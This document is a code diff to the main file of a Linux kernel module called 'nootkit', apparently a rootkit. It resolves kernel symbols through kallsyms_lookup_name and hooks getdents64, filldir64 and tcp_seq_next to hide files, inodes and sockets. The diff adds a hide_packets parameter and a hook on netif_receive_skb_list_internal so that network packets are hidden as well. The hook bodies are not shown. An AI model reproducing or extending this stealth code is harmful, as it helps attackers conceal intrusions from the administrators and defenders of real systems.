@@ -6,11 +6,10 @@
 #include <linux/printk.h>
 #include <linux/errno.h>
 
-#include "license.h"
-#include "ksyms.h"
-#include "config.h"
-#include "hide/readdir.h"
-#include "hide/proc_net.h"
+#include <license.h>
+#include <ksyms.h>
+#include <config.h>
+#include <hide.h>
 
 static unsigned long kallsyms_lookup_name_addr;
 module_param_named(kallsyms_lookup_name, kallsyms_lookup_name_addr, ulong, 0);
@@ -26,6 +25,10 @@ module_param_array(hide_inodes, ulong, &hide_inodes_count, 0);
 char *hide_sockets_strs[MAX_HIDE_ENTITIES];
 int hide_sockets_count;
 module_param_array_named(hide_sockets, hide_sockets_strs, charp, &hide_sockets_count, 0);
+
+char *hide_packets_strs[MAX_HIDE_ENTITIES];
+int hide_packets_count;
+module_param_array_named(hide_packets, hide_packets_strs, charp, &hide_packets_count, 0);
 
 int nootkit_init(void)
 {
@@ -45,19 +48,22 @@ int nootkit_init(void)
         printk(KERN_ERR "nootkit: Failed to find all required kernel symbols, aborting.");
         return -EFAULT;
     }
-
+    
     hide_hook_set_getdents64();
     hide_hook_set_filldir64();
     hide_hook_set_tcp_seq_next();
+    hide_hook_set_netif_receive_skb_list_internal();
 
     return 0;
 }
 
+
 void nootkit_exit(void)
 {
+    hide_hook_unset_getdents64();
     hide_hook_unset_filldir64();
     hide_hook_unset_tcp_seq_next();
-    hide_hook_unset_getdents64();
+    hide_hook_unset_netif_receive_skb_list_internal();
 
     printk(KERN_INFO "Unloaded nootkit!\n");
 }
